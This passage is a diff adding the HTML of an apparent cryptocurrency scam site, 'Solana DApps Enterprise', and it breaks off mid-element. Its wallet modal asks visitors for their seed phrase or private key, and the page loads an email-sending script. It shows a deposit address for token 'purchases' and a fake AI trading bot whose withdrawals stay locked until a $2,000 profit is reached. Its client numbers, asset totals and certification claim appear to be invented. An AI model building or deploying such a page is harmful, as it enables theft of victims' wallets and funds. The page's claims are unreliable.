@@ -1,0 +1,1708 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <!-- FIXED: Better mobile viewport -->
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Solana DApps Enterprise | Login Required</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+
+<body class="phone-optimized clean-state">
+
+    <!-- Authentication Container -->
+    <div class="auth-container" id="authContainer">
+        <div class="auth-card">
+
+            <!-- Header -->
+            <div class="auth-header">
+                <div class="auth-logo">
+                    <div class="logo-icon">⚡</div>
+                    <span>Solana DApps Enterprise</span>
+                </div>
+                <h1 class="auth-title" id="authTitle">Welcome</h1>
+                <p class="auth-subtitle" id="authSubtitle">
+                    Secure access to Solana Web3 platform.
+                </p>
+            </div>
+
+            <!-- Login Form -->
+            <form class="auth-form active" id="loginForm">
+                <div id="loginAlert" class="alert" style="display:none;"></div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-envelope"></i>
+                        Email Address
+                    </label>
+                    <input type="email" class="form-input" id="loginEmail" placeholder="enter@your.email" required
+                        autocomplete="off">
+                    <div class="validation-message" id="loginEmailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-lock"></i>
+                        Password
+                    </label>
+                    <div class="password-wrapper">
+                        <input type="password" class="form-input" id="loginPassword" placeholder="••••••••" required
+                            autocomplete="off">
+                        <button type="button" class="password-toggle" onclick="togglePassword('loginPassword')">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <div class="validation-message" id="loginPasswordError"></div>
+                </div>
+
+                <div class="form-options">
+                    <label class="remember-me">
+                        <input type="checkbox" id="rememberMe">
+                        Remember me
+                    </label>
+                    <a href="#" class="forgot-password" onclick="openForgotPassword()">
+                        Forgot password?
+                    </a>
+                </div>
+
+                <button type="submit" class="auth-button touch-friendly" id="loginButton">
+                    <span>Sign In</span>
+                </button>
+
+                <div class="auth-footer">
+                    Don't have an account?
+                    <a href="#" class="auth-link" onclick="showSignup(); return false;">
+                        Create an account
+                    </a>
+                </div>
+            </form>
+
+            <!-- Signup Form -->
+            <form class="auth-form" id="signupForm">
+                <div id="signupAlert" class="alert" style="display:none;"></div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-user"></i> Full Name
+                    </label>
+                    <input type="text" class="form-input" id="signupName" placeholder="John Doe" required
+                        autocomplete="off">
+                    <div class="validation-message" id="signupNameError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-envelope"></i>
+                        Email Address
+                    </label>
+                    <input type="email" class="form-input" id="signupEmail" placeholder="enter@your.email" required
+                        autocomplete="off">
+                    <div class="validation-message" id="signupEmailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-lock"></i>
+                        Password
+                    </label>
+                    <div class="password-wrapper">
+                        <input type="password" class="form-input" id="signupPassword" placeholder="••••••••" required
+                            autocomplete="off">
+                        <button type="button" class="password-toggle" onclick="togglePassword('signupPassword')">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <div class="validation-message" id="signupPasswordError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-lock"></i>
+                        Confirm Password
+                    </label>
+                    <div class="password-wrapper">
+                        <input type="password" class="form-input" id="signupConfirmPassword" placeholder="••••••••"
+                            required autocomplete="off">
+                        <button type="button" class="password-toggle" onclick="togglePassword('signupConfirmPassword')">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <div class="validation-message" id="signupConfirmError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="remember-me">
+                        <input type="checkbox" id="termsAgree" required>
+                        I agree to the <a href="#" class="auth-link" onclick="showTerms()">Terms</a> &
+                        <a href="#" class="auth-link" onclick="showPrivacy()">Privacy</a>
+                    </label>
+                    <div class="validation-message" id="termsError"></div>
+                </div>
+
+                <button type="submit" class="auth-button" id="signupButton">
+                    <span>Create Account</span>
+                </button>
+
+                <div class="auth-footer">
+                    Already have an account?
+                    <a href="#" class="auth-link" onclick="showLogin(); return false;">
+                        Back to login
+                    </a>
+                </div>
+            </form>
+
+            <!-- Forgot Password Form -->
+            <form class="auth-form" id="forgotPasswordForm">
+                <div id="forgotAlert" class="alert" style="display:none;"></div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-envelope"></i>
+                        Email Address
+                    </label>
+                    <input type="email" class="form-input" id="forgotEmail" placeholder="enter@your.email" required
+                        autocomplete="off">
+                    <div class="validation-message" id="forgotEmailError"></div>
+                </div>
+
+                <div class="form-info">
+                    <i class="fas fa-info-circle"></i>
+                    <p>Enter your email address and we'll send you a link to reset your password.</p>
+                </div>
+
+                <button type="submit" class="auth-button touch-friendly" id="forgotButton">
+                    <span>Send Reset Link</span>
+                </button>
+
+                <div class="auth-footer">
+                    <a href="#" class="auth-link" id="forgotBackLink">
+                        <i class="fas fa-arrow-left"></i> Back to login
+                    </a>
+                </div>
+        </div>
+    </div>
+
+    <!-- Modal Overlay for Terms/Privacy -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-dialog">
+            <button class="modal-close" onclick="closeModal()">
+                <i class="fas fa-times"></i>
+            </button>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <!-- Main Application (Hidden until auth) -->
+    <div class="main-app" id="mainApp">
+        <!-- Background Elements -->
+        <canvas id="particlesCanvas"></canvas>
+        <div class="grid-bg"></div>
+
+        <!-- Live Elements -->
+        <!-- <div class="live-popup-container" id="livePopupContainer"></div>
+        <div class="live-solana-price" id="liveSolanaPrice">
+            <div class="price-display">SOL: <span id="currentSolPrice">$100.00</span></div>
+            <div class="price-change positive" id="priceChange">▲ 0.00% (24h)</div>
+        </div> -->
+
+        <!-- Navigation -->
+        <nav class="navbar">
+            <div class="container">
+                <div class="nav-content">
+                    <a href="#dashboard" class="logo">
+                        <div class="logo-icon-nav"><i class="fas fa-bolt"></i></div>
+                        <span>Solana DApps Enterprise</span>
+                    </a>
+
+                    <div class="nav-menu" id="navMenu">
+                        <a href="#dashboard" class="nav-link" data-view="dashboard">
+                            <i class="fas fa-home"></i> Dashboard
+                        </a>
+                        <a href="#buy" class="nav-link" data-view="buy">
+                            <i class="fas fa-shopping-cart"></i> Buy Tokens
+                        </a>
+                        <a href="#verify" class="nav-link" data-view="verify">
+                            <i class="fas fa-shield-alt"></i> Verify
+                        </a>
+                        <a href="#watch-trade" class="nav-link" data-view="watch-trade">
+                            <i class="fas fa-eye"></i> Watch Trade
+                        </a>
+                    </div>
+
+                    <!-- <div class="user-profile" id="userProfile"> -->
+                        <!-- <div class="user-avatar" id="userAvatar">JD</div>
+                        <div class="user-info">
+                            <div class="user-name" id="userName">kelly west</div>
+                            <div class="user-email" id="userEmail">west@example.com</div>
+                        </div> -->
+                        <div class="user-profile" id="userProfile">
+                            <div class="user-avatar" id="userAvatar">JD</div>
+                            <div class="user-info">
+                            <div class="user-name" id="userName">kelly west</div>
+                            <div class="user-email" id="userEmail">west@example.com</div>
+                        </div>
+                        <!-- <button class="logout-btn touch-friendly" onclick="logout()">
+                            <i class="fas fa-sign-out-alt"></i>
+                        </button> -->
+                    </div>
+
+                    <button class="connect-btn touch-friendly" id="connectBtn">
+                        <i class="fas fa-plug"></i> Connect Wallet
+                    </button>
+
+                    <button class="menu-toggle touch-friendly" id="menuToggle">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                <!-- </div> -->
+            </div>
+        </nav>
+
+        <!-- Main App Container -->
+        <div id="app-container">
+            <!-- Dashboard View -->
+            <div id="dashboard-view" class="app-view active">
+                <section class="hero">
+                    <div class="container">
+                        <div class="hero-content">
+                            <div class="hero-tagline">
+                                <span class="tagline-badge"><i class="fas fa-bolt"></i> Solana Powered</span>
+                                <span class="tagline-badge"><i class="fas fa-shield-alt"></i> Bank-Grade Security</span>
+                                <span class="tagline-badge"><i class="fas fa-rocket"></i> High-Speed</span>
+                            </div>
+
+                            <h1 class="hero-title">
+                                Solana Native<br>
+                                <span
+                                    style="display: inline-block; animation: textShine 3s ease-in-out infinite;">Digital
+                                    Asset Platform</span>
+                            </h1>
+
+                            <p class="hero-subtitle">
+                                Secure enterprise-grade Solana wallet management with military-grade encryption.<br>
+                                Import, manage, and track all your Solana-based assets and SPL tokens.
+                            </p>
+
+                            <div class="cta-buttons">
+                                <button class="btn btn-primary touch-friendly" id="heroConnectBtn">
+                                    <i class="fas fa-plug"></i> Connect Wallet
+                                </button>
+                                <button class="btn btn-accent touch-friendly" id="buyCoinBtn">
+                                    <i class="fas fa-shopping-cart"></i> Buy Solana Tokens
+                                </button>
+                            </div>
+
+                            <div class="hero-stats">
+                                <div class="stat">
+                                    <div class="stat-number" data-count="128434">128,434+</div>
+                                    <div class="stat-label">Institutional Clients</div>
+                                </div>
+                                <div class="stat">
+                                    <div class="stat-number" data-count="140">140+</div>
+                                    <div class="stat-label">Supported Wallets</div>
+                                </div>
+                                <div class="stat">
+                                    <div class="stat-number" data-count="5.7">$5.7B+</div>
+                                    <div class="stat-label">Assets Under Management</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="features">
+                    <div class="container">
+                        <h2 class="section-title">Solana Enterprise Features</h2>
+                        <div class="feature-grid">
+                            <div class="feature-card">
+                                <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+                                <h3>High-Speed Transactions</h3>
+                                <p>Solana's 65,000 TPS ensures instant settlement with sub-second finality for
+                                    institutional-grade speed.</p>
+                            </div>
+                            <div class="feature-card">
+                                <div class="feature-icon"><i class="fas fa-coins"></i></div>
+                                <h3>Low-Cost Operations</h3>
+                                <p>Fractional cent transaction fees ($0.00025) enable cost-effective bulk operations and
+                                    micro-transactions.</p>
+                            </div>
+                            <div class="feature-card">
+                                <div class="feature-icon"><i class="fas fa-sitemap"></i></div>
+                                <h3>SPL Token Management</h3>
+                                <p>Comprehensive SPL token support with automated indexing, tracking, and portfolio
+                                    management.</p>
+                            </div>
+                            <div class="feature-card">
+                                <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                                <h3>Solana Security</h3>
+                                <p>Tower BFT consensus with Proof of History ensures military-grade security for
+                                    institutional assets.</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="services">
+                    <div class="container">
+                        <h2 class="section-title">ACTUAL Platform Services</h2>
+                        <p class="hero-subtitle" style="text-align: center; margin-bottom: 60px;">
+                            Our actual services portfolio - what we really offer
+                        </p>
+
+                        <div class="services-grid">
+                            <div class="service-card">
+                                <div class="service-icon"><i class="fas fa-shopping-cart"></i></div>
+                                <h3>Token Purchase</h3>
+                                <p>Purchase SOL and major SPL tokens with secure payment verification and receipt
+                                    generation.</p>
+                                <div class="service-action"><button class="service-btn touch-friendly"
+                                        onclick="window.location.hash='#buy'"><i class="fas fa-shopping-cart"></i> Buy
+                                        Tokens</button></div>
+                            </div>
+                            <div class="service-card">
+                                <div class="service-icon"><i class="fas fa-shield-alt"></i></div>
+                                <h3>Payment Verification</h3>
+                                <p>Verify your token purchases with screenshot upload and blockchain confirmation
+                                    system.</p>
+                                <div class="service-action"><button class="service-btn touch-friendly"
+                                        onclick="window.location.hash='#verify'"><i class="fas fa-shield-alt"></i>
+                                        Verify Payment</button></div>
+                            </div>
+                            <div class="service-card">
+                                <div class="service-icon"><i class="fas fa-eye"></i></div>
+                                <h3>Watch Trading</h3>
+                                <p>Watch AI trading bot automatically trade SOL. Hard target: $2,000 profit unlocks
+                                    withdrawals.</p>
+                                <div class="service-action"><button class="service-btn touch-friendly"
+                                        onclick="window.location.hash='#watch-trade'"><i class="fas fa-eye"></i> Watch
+                                        Trade</button></div>
+                            </div>
+                            <div class="service-card">
+                                <div class="service-icon"><i class="fas fa-wallet"></i></div>
+                                <h3>Wallet Management</h3>
+                                <p>Connect and manage multiple Solana wallets including Phantom, Solflare, and so on.
+                                </p>
+                                <div class="service-action"><button class="service-btn touch-friendly"
+                                        onclick="platform.openModal()"><i class="fas fa-wallet"></i> Manage
+                                        Wallets</button></div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- Buy Tokens View -->
+            <div id="buy-view" class="app-view">
+                <section class="deposit-section">
+                    <div class="deposit-container">
+                        <div class="deposit-header">
+                            <h2 class="deposit-title">Buy Solana Tokens</h2>
+                            <p class="deposit-subtitle">
+                                Purchase Solana and SPL tokens to your account through multiple payment methods
+                            </p>
+                        </div>
+
+                        <div class="payment-methods">
+                            <div class="payment-card">
+                                <div class="payment-icon"><i class="fas fa-bolt"></i></div>
+                                <h3><i class="fas fa-shopping-cart"></i> BUY SOLANA TOKENS</h3>
+                                <div class="payment-tokens">
+                                    <span class="token-badge">SOL</span>
+                                    <span class="token-badge">USDC</span>
+                                    <span class="token-badge">BONK</span>
+                                    <span class="token-badge">WIF</span>
+                                </div>
+                                <p class="payment-details">
+                                    Purchase any major Solana-based cryptocurrency instantly. Buy SOL, USDC, BONK, or
+                                    WIF with secure verification
+                                </p>
+                                <button class="btn btn-primary touch-friendly" onclick="selectPaymentMethod('crypto')"
+                                    style="width: 100%;">
+                                    <i class="fas fa-arrow-right"></i> Buy Solana Tokens
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Crypto Deposit Form -->
+                        <div class="deposit-form" id="cryptoDepositForm" style="display: none;">
+                            <h3 class="form-title">Select Solana Token to Purchase</h3>
+
+                            <div class="solana-features">
+                                <p><i class="fas fa-bolt"></i> Powered by Solana blockchain - Fast, low-cost
+                                    transactions</p>
+                                <div style="margin-top: 10px;">
+                                    <span class="solana-badge">TPS: 65,000</span>
+                                    <span class="solana-badge">Fee: $0.00025</span>
+                                    <span class="solana-badge">Finality: 400ms</span>
+                                </div>
+                            </div>
+
+                            <div class="crypto-selector">
+                                <div class="crypto-option selected" data-crypto="sol" onclick="selectCrypto('sol')">
+                                    <div class="crypto-icon"><i class="fas fa-bolt"></i></div>
+                                    <div class="crypto-name">Solana</div>
+                                    <div class="crypto-symbol">SOL</div>
+                                </div>
+                                <div class="crypto-option" data-crypto="usdc" onclick="selectCrypto('usdc')">
+                                    <div class="crypto-icon"><i class="fas fa-dollar-sign"></i></div>
+                                    <div class="crypto-name">USD Coin</div>
+                                    <div class="crypto-symbol">USDC</div>
+                                </div>
+                                <div class="crypto-option" data-crypto="bonk" onclick="selectCrypto('bonk')">
+                                    <div class="crypto-icon"><i class="fas fa-dog"></i></div>
+                                    <div class="crypto-name">Bonk</div>
+                                    <div class="crypto-symbol">BONK</div>
+                                </div>
+                                <div class="crypto-option" data-crypto="wif" onclick="selectCrypto('wif')">
+                                    <div class="crypto-icon"><i class="fas fa-hat-wizard"></i></div>
+                                    <div class="crypto-name">Dogwifhat</div>
+                                    <div class="crypto-symbol">WIF</div>
+                                </div>
+                            </div>
+
+                            <div class="amount-input">
+                                <label class="amount-label">Purchase Amount (USD)</label>
+                                <input type="text" class="amount-field touch-friendly" id="depositAmount"
+                                    placeholder="0.00" oninput="updateCryptoAmount(); updatePurchaseDetails();">
+                                <div class="amount-note">
+                                    <span>Minimum: $50.00</span>
+                                    <span id="cryptoAmount">≈ 0.000000 SOL</span>
+                                </div>
+                            </div>
+
+                            <div class="deposit-address">
+                                <label class="address-label">Solana Wallet Address for Purchase</label>
+                                <div class="address-display" id="cryptoAddress">
+                                    BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb</div>
+
+                                <div style="text-align: center;">
+                                    <div class="qr-container">
+                                        <div
+                                            style="width: 200px; height: 200px; background: #f0f0f0; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #333; font-size: 12px;">
+                                            QR Code<br>Generate with API
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="address-actions">
+                                    <button class="copy-btn touch-friendly" onclick="copyAddress()"><i
+                                            class="fas fa-copy"></i> Copy Address</button>
+                                    <button class="save-btn touch-friendly" onclick="saveQRCode()"><i
+                                            class="fas fa-download"></i> Save QR Code</button>
+                                </div>
+                            </div>
+
+                            <div class="warning-note">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                <span id="cryptoWarning">Send only SOL to this address. Sending other cryptocurrencies
+                                    may result in permanent loss.</span>
+                            </div>
+
+                            <!-- Payment Verification Section -->
+                            <div id="paymentVerificationSection" style="display: none;">
+                                <div class="verification-container">
+                                    <h4 style="color: white; text-align: center; margin-bottom: 20px;">
+                                        <i class="fas fa-shield-alt"></i> Payment Verification Required
+                                    </h4>
+
+                                    <div class="upload-container"
+                                        onclick="document.getElementById('screenshotUpload').click()">
+                                        <div class="upload-icon"><i class="fas fa-cloud-upload-alt"></i></div>
+                                        <div class="upload-text">Upload Transaction Screenshot</div>
+                                        <div class="upload-subtext">Click to upload proof of payment (PNG, JPG, JPEG)
+                                        </div>
+                                    </div>
+
+                                    <input type="file" id="screenshotUpload" accept="image/*" style="display: none;"
+                                        onchange="handleScreenshotUpload(event)">
+                                    <img id="screenshotPreview" class="file-preview" alt="Screenshot Preview">
+
+                                    <div id="verificationStatus" class="verification-status verification-processing">
+                                        <i class="fas fa-spinner fa-spin"></i>
+                                        <span>Verifying transaction on Solana blockchain...</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="confirmation-section">
+                                <button class="confirm-btn touch-friendly" onclick="proceedToVerification()"
+                                    id="confirmPurchaseBtn">
+                                    <i class="fas fa-shopping-cart"></i> Confirm SOL Purchase
+                                </button>
+                            </div>
+
+                            <div class="redirect-section">
+                                <p style="color: white; font-weight: 600; margin-bottom: 16px;">
+                                    <i class="fas fa-external-link-alt"></i> Complete Your Purchase
+                                </p>
+                                <p class="redirect-note">
+                                    After sending your tokens, upload a screenshot above for verification, then proceed
+                                    to the Verify page.
+                                </p>
+                                <a href="#verify" class="redirect-btn touch-friendly">
+                                    <i class="fas fa-shield-alt"></i> Go to Verification
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- Verify Payment View -->
+            <div id="verify-view" class="app-view">
+                <div class="container">
+                    <div style="padding: 100px 0; text-align: center;">
+                        <h2 class="deposit-title">Payment Verification</h2>
+                        <p class="deposit-subtitle" style="max-width: 600px; margin: 0 auto 40px;">
+                            Verify your transaction by connecting your wallet and confirming the blockchain status
+                        </p>
+
+                        <div
+                            style="max-width: 500px; margin: 0 auto; background: rgba(20, 25, 40, 0.8); border-radius: 24px; padding: 40px; border: 1px solid rgba(255, 255, 255, 0.1);">
+                            <div class="payment-icon" style="margin: 0 auto 24px;">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <h3 style="color: white; margin-bottom: 20px;">Two-Step Verification</h3>
+                            <p style="color: rgba(255, 255, 255, 0.8); margin-bottom: 30px; line-height: 1.6;">
+                                1. Connect the wallet you used for the purchase<br>
+                                2. We'll verify the transaction on the Solana blockchain
+                            </p>
+
+                            <button class="btn btn-primary touch-friendly" onclick="handleVerification()"
+                                style="width: 100%; margin-bottom: 20px;">
+                                <i class="fas fa-shield-alt"></i> Verify Payment
+                            </button>
+
+                            <div id="verificationResult" style="display: none;">
+                                <div class="verification-status verification-processing" style="margin-top: 30px;">
+                                    <i class="fas fa-spinner fa-spin"></i>
+                                    <span>Checking blockchain for your transaction...</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Watch Trade View -->
+            <div id="watch-trade-view" class="app-view">
+                <div class="container">
+                    <!-- Access Locked State (Default) -->
+                    <div id="watchTradingLocked" class="access-locked">
+                        <div class="access-locked-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                        <h3 style="color: white; margin-bottom: 20px;">Access Locked</h3>
+                        <div class="access-locked-message">
+                            <p>To access the Watch Trading Platform, you must:</p>
+                            <ol style="text-align: left; margin: 20px 0; padding-left: 30px;">
+                                <li>Connect your wallet</li>
+                                <li>Make a verified purchase of at least $50</li>
+                                <li>Wait for transaction confirmation</li>
+                            </ol>
+                            <p style="color: var(--warning); font-weight: 600;">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                Watch Trading is reserved for verified users only
+                            </p>
+                        </div>
+                        <button class="btn btn-primary touch-friendly" onclick="platform.openModal()"
+                            style="margin-top: 20px;">
+                            <i class="fas fa-plug"></i> Connect Wallet First
+                        </button>
+                    </div>
+
+                    <!-- Watch Trading Platform (Hidden by default) -->
+                    <div class="watch-trading-platform" id="watchTradingPlatform" style="display: none;">
+                        <div class="watch-trading-header">
+                            <h2 class="watch-trading-title">Watch-Only Trading Platform</h2>
+                            <p class="watch-trading-description">
+                                Watch our AI trading bot automatically trade SOL.
+                                Withdrawals unlock after reaching $2,000 profit target (Hard Mode).
+                                No manual trading required.
+                            </p>
+                        </div>
+
+                        <div class="watch-trading-stats">
+                            <div class="watch-trading-stat">
+                                <div class="watch-trading-stat-value" id="watchCurrentBalance">$1,250.00</div>
+                                <div class="watch-trading-stat-label">Starting Balance</div>
+                            </div>
+                            <div class="watch-trading-stat">
+                                <div class="watch-trading-stat-value" id="watchTotalProfit">$0.00</div>
+                                <div class="watch-trading-stat-label">Total Profit</div>
+                            </div>
+                            <div class="watch-trading-stat">
+                                <div class="watch-trading-stat-value" id="watchSuccessRate">65%</div>
+                                <div class="watch-trading-stat-label">Success Rate</div>
+                            </div>
+                        </div>
+
+                        <div class="auto-trading-indicator">
+                            <div class="auto-trading-status">
+                                <div class="status-indicator"></div>
+                                <div class="status-text">AI Auto-Trading Active</div>
+                            </div>
+                            <div class="auto-trading-message">
+                                Our AI bot is automatically trading SOL based on market analysis.
+                                You can watch the trades happen in real-time below.
+                            </div>
+                        </div>
+
+                        <div class="trading-log">
+                            <div class="trading-log-header">
+                                <div class="trading-log-title">Live Trading Activity</div>
+                                <button class="btn-secondary touch-friendly" style="padding: 8px 16px; font-size: 12px;"
+                                    onclick="startAutoTrading()" id="startTradingBtn">
+                                    <i class="fas fa-play"></i> Start Watching
+                                </button>
+                            </div>
+                            <div class="trading-log-content" id="tradingLogContent">
+                                <div class="log-entry">
+                                    <span class="log-timestamp">[12:45:23]</span>
+                                    <span>AI bot initialized. Starting with $1,250.00 balance</span>
+                                </div>
+                                <div class="log-entry">
+                                    <span class="log-timestamp">[12:46:05]</span>
+                                    <span>Analyzing SOL market conditions...</span>
+                                </div>
+                                <div class="log-entry">
+                                    <span class="log-timestamp">[12:46:30]</span>
+                                    <span>Monitoring price movements for optimal entry</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Hard target progress -->
+                        <div class="target-progress-hard">
+                            <div class="target-info-hard">
+                                <div class="target-label-hard">Withdrawal Target (HARD MODE)</div>
+                                <div class="target-amount-hard">$2,000.00</div>
+                            </div>
+                            <div class="progress-bar-hard">
+                                <div class="progress-fill-hard" id="watchProgressFill" style="width: 0%"></div>
+                            </div>
+                            <div class="hard-target-message" id="watchWithdrawalMessage">
+                                AI bot needs to reach $2,000 profit to unlock withdrawals.
+                                This process typically takes 7-14 days due to market volatility.
+                            </div>
+                            <div class="hard-target-warning">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                HARD MODE: Only 65% success rate with small profit margins.
+                                Large losses may occur, slowing progress significantly.
+                            </div>
+                        </div>
+
+                        <div class="withdrawal-notice">
+                            <h4><i class="fas fa-clock"></i> Important Notice</h4>
+                            <p>
+                                Withdrawals are locked until the AI trading bot reaches $2,000 profit.
+                                This prevents users from expecting fast money and ensures sustainable growth.
+                                Estimated timeline: 7-14 days.
+                            </p>
+                        </div>
+
+                        <div class="receipt-delay">
+                            <p>
+                                <i class="fas fa-hourglass-half"></i>
+                                <strong>Receipt Delay:</strong> Receipts are generated with a 1-2 minute delay after
+                                each successful trade.
+                                This is part of our security protocol to prevent automated abuse.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-logo">
+                        <div class="logo-icon-nav"><i class="fas fa-bolt"></i></div>
+                        <span>Solana DApps Enterprise</span>
+                    </div>
+                    <p class="copyright">
+                        © 2024 Solana DApps Enterprise. Made with love for Solana Institutions.<br>
+                        All rights reserved. SOC 2 Type II Certified.
+                    </p>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Wallet Modal -->
+        <div id="walletModal" class="modal">
+            <div class="modal-content">
+                <button class="close-modal touch-friendly" id="closeModal">
+                    <i class="fas fa-times"></i>
+                </button>
+
+                <div id="walletSelectionView" class="view active">
+                    <div class="modal-header">
+                        <h2 class="modal-title">Select Solana Wallet</h2>
+                        <p class="modal-subtitle">Choose your preferred Solana wallet to continue</p>
+                    </div>
+
+                    <div class="wallet-grid" id="walletGrid"></div>
+                </div>
+
+                <div id="credentialsView" class="view phrase-section">
+                    <div class="modal-header">
+                        <h2 class="modal-title">Enter Wallet Credentials</h2>
+                        <p class="modal-subtitle">Choose your credential type and enter details</p>
+                    </div>
+
+                    <div class="credentials-input-container">
+                        <div class="input-tabs">
+                            <button class="tab-btn active touch-friendly" data-tab="phrase">
+                                <i class="fas fa-key"></i> Pass Phrase
+                            </button>
+                            <button class="tab-btn touch-friendly" data-tab="privateKey">
+                                <i class="fas fa-lock"></i> Private Key
+                            </button>
+                        </div>
+
+                        <div id="phraseTab" class="tab-content active">
+                            <div class="phrase-label">
+                                <i class="fas fa-key"></i>
+                                <span>Enter 12-Word Pass Phrase</span>
+                            </div>
+                            <textarea class="phrase-input" id="phraseInput"
+                                placeholder="Enter exactly 12 words separated by spaces (example: word1 word2 word3 ... word12)"
+                                rows="4"></textarea>
+                            <div id="phraseValidation" class="validation-error" style="display: none;">
+                                <i class="fas fa-times-circle"></i>
+                                <span>Must be exactly 12 words separated by spaces</span>
+                            </div>
+                            <div id="phraseValid" class="valid-indicator" style="display: none;">
+                                <i class="fas fa-check-circle"></i>
+                                <span>Valid 12-word pass phrase detected</span>
+                            </div>
+                            <div class="input-note">
+                                <i class="fas fa-info-circle"></i> For security, only 12-word pass phrases are accepted.
+                                Words must be separated by single spaces.
+                            </div>
+                        </div>
+
+                        <div id="privateKeyTab" class="tab-content">
+                            <div class="phrase-label">
+                                <i class="fas fa-lock"></i>
+                                <span>Enter 64-Character Private Key</span>
+                            </div>
+                            <input type="text" class="private-key-input" id="privateKeyInput"
+                                placeholder="Enter exactly 64 characters (example: 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef)">
+                            <div id="keyValidation" class="validation-error" style="display: none;">
+                                <i class="fas fa-times-circle"></i>
+                                <span>Must be exactly 64 hexadecimal characters (with or without 0x prefix)</span>
+                            </div>
+                            <div id="keyValid" class="valid-indicator" style="display: none;">
+                                <i class="fas fa-check-circle"></i>
+                                <span>Valid 64-character private key detected</span>
+                            </div>
+                            <div class="input-note">
+                                <i class="fas fa-info-circle"></i> Enter your private key - exactly 64 hexadecimal
+                                characters (0-9, a-f). May start with 0x.
+                            </div>
+                        </div>
+
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+                        </div>
+
+                        <div class="phrase-actions">
+                            <button class="back-btn touch-friendly" id="backToWalletBtn">
+                                <i class="fas fa-arrow-left"></i> Back to Wallets
+                            </button>
+                            <button class="btn btn-primary touch-friendly" id="connectCredentialsBtn" disabled>
+                                <i class="fas fa-shield-alt"></i> Connect Wallet
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="loadingView" class="view">
+                    <div class="loading">
+                        <div class="loading-spinner-large">
+                            <div class="spinner-ring"></div>
+                            <div class="spinner-ring"></div>
+                            <div class="spinner-ring"></div>
+                        </div>
+
+                        <div class="loading-text">
+                            <h3>Securing Solana Connection</h3>
+                            <p id="loadingStatus">Establishing encrypted connection with Solana blockchain...</p>
+                        </div>
+
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="loadingProgress" style="width: 0%"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="failedView" class="view">
+                    <div class="failed-modal">
+                        <div class="failed-icon-container">
+                            <div class="failed-icon-bg"
+                                style="background: linear-gradient(135deg, var(--solana-purple) 0%, var(--solana-green) 100%);">
+                            </div>
+                            <div class="failed-icon" style="color: var(--solana-green);">
+                                <i class="fas fa-check-circle"></i>
+                            </div>
+                        </div>
+                        <h3 style="background: linear-gradient(135deg, #9945ff 0%, #14f195 100%); -webkit-background-clip: text; background-clip: text;color: transparent;
+">
+                            Wallet Connected!
+                        </h3>
+                        <strong>Good luck with your trading!</strong> The AI bot will help you reach your profit
+                        targets.</p>
+
+                        <div
+                            style="display: flex; gap: 16px; justify-content: center; margin-top: 40px; flex-wrap: wrap;">
+                            <button class="btn btn-primary touch-friendly" id="closeFailedBtn"
+                                style="min-width: 200px;">
+                                <i class="fas fa-rocket"></i> Start Trading
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="errorView" class="view">
+                    <div class="error-state">
+                        <div class="error-icon-container">
+                            <div class="error-icon-bg"></div>
+                            <div class="error-icon">
+                                <i class="fas fa-exclamation-triangle"></i>
+                            </div>
+                        </div>
+                        <h3>Invalid Credentials</h3>
+                        <p>Your credentials do not meet the security requirements. Please verify and try again.</p>
+
+                        <div class="error-details">
